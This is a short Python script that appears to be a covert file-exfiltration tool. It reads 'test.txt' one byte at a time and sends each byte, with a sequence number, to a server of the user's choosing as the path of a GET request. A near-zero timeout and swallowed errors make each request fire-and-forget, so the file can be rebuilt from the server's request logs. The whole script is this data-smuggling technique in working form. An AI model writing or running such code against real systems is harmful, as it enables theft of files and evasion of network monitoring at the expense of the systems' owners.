import urllib.request
import urllib.parse
import requests

#change to your server
server = "http://127.0.0.1/"

with open("test.txt", "rb") as f:
    #maybe there will be connection problem or packet loss so to follow order first 7 char will be byte order of data
    #add 0 if you want to increase
    order = 1000000
    
    while 1:
        byte = f.read(1)
        if not byte:
            break
        print(byte)

        #request to server
        try:
            requests.get(server + str(order) + str(ord(byte)),timeout=0.0000000001)
        except: 
            pass
        order += 1
    